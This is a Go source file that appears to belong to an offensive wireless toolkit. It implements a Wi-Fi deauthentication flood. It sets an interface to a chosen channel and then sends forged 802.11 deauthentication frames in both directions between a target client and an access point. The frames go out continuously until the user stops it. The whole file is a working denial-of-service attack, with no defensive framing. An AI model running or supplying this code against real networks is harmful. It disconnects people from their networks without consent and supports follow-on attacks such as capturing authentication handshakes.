package deauth

import (
	"fmt"
	"net"
	"time"

	"offscan/frame80211"
	"offscan/ifconfig"
	"offscan/sockets"
	"offscan/utils"
)



type Deauthentication struct {
    builder    *frame80211.Deauth
    frmsSent   int
    seqNum     uint16
    socket     *sockets.Layer2Socket
    apMac      net.HardwareAddr
    targetMac  net.HardwareAddr
    delay      time.Duration
}



func NewDeauthentication(argList []string) *Deauthentication {
    args := ParseArgs(argList)
    
    ifconfig.MustSetChannel(args.Iface, args.Channel)
    displayExecInfo(args)

    return &Deauthentication{
        builder:   frame80211.NewDeauthFrame(args.Bssid),
        frmsSent:  0,
        seqNum:    1,
        socket:    sockets.NewL2Socket(args.Iface),
        targetMac: args.TargetMac,
        apMac:     args.Bssid,
        delay:     time.Duration(args.Delay) * time.Millisecond,
    }
}



func displayExecInfo(args *DeauthArgs) {
    fmt.Printf("[*] IFACE...: %s\n", args.Iface.Name)
    fmt.Printf("[*] BSSID...: %s\n", args.Bssid.String())
    fmt.Printf("[*] TARGET..: %s\n", args.TargetMac.String())
    fmt.Printf("[*] CHANNEL.: %d\n", args.Channel)
}



func (d *Deauthentication) Execute() {
    ctx := utils.SignalContext()

    fmt.Println("[+] Sending frames. Press Ctrl + C to stop")
    start := time.Now()
    shots := 0

    for {
        select {
        case <-ctx.Done():
            elapsed := time.Since(start).Seconds()
            fmt.Printf("\n[-] Flood interrupted\n")
            fmt.Printf("[%%] Frames sent: %d in %.2f s\n", d.frmsSent, elapsed)
            return

        default:
            d.sendFrame(d.targetMac, d.apMac)
            d.sendFrame(d.apMac, d.targetMac)
            shots += 2

            if shots >= 128 {
                shots = 0
                time.Sleep(d.delay)
            }
        }
    }
}



func (d *Deauthentication) sendFrame(srcMac, dstMac net.HardwareAddr) {
    frame := d.builder.Frame(dstMac, srcMac, d.seqNum)
    d.socket.Send(frame)
    
	d.updateSeqNum()
    d.frmsSent++
}



func (d *Deauthentication) updateSeqNum() {
    if d.seqNum >= 4095 {
        d.seqNum = 0
    }
    d.seqNum++
}